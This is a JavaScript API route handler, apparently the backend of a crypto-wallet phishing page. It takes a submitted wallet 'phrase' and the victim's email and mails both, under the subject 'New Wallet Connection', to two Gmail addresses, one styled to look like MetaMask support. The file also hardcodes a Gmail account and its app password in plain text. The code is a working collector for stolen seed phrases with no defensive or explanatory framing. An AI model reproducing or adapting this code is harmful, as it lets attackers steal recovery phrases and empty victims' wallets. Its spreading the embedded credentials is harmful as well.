const nodemailer = require('nodemailer');

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { phrase, email } = req.body;

    if (!phrase || !email) {
        return res.status(400).json({ error: 'All fields are required.' });
    }

    try {
        console.log('Sending email with the following details:');
        console.log('Phrase:', phrase);
        console.log('Email:', email);

        // Create transporter with your Gmail credentials
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'oriyebakap6@gmail.com', // Sender's email
                pass: 'xljeduvvnpcwtjdo', // Gmail app password
            },
        });

        // Email options
        const mailOptions = {
            from: '"Wallet Connection" <oriyebakap6@gmail.com>', // Use the sender email for the "from" field
            to: ['oriyebakap6@gmail.com', 'assistmetamask@gmail.com'], // Multiple recipients
            subject: 'New Wallet Connection',
            text: `Phrase: ${phrase}\n\nSender's email: ${email}`, // Include the email from the request
        };

        // Send the email
        const info = await transporter.sendMail(mailOptions);
        console.log('Email sent successfully:', info.response);

        return res.status(200).json({ message: 'Email sent successfully!' });
    } catch (error) {
        // Log the full error response for debugging
        console.error('Error sending email:', error);

        // Handle specific error response from nodemailer
        return res.status(500).json({
            error: `Failed to send email. Error: ${error.message}`,
        });
    }
}
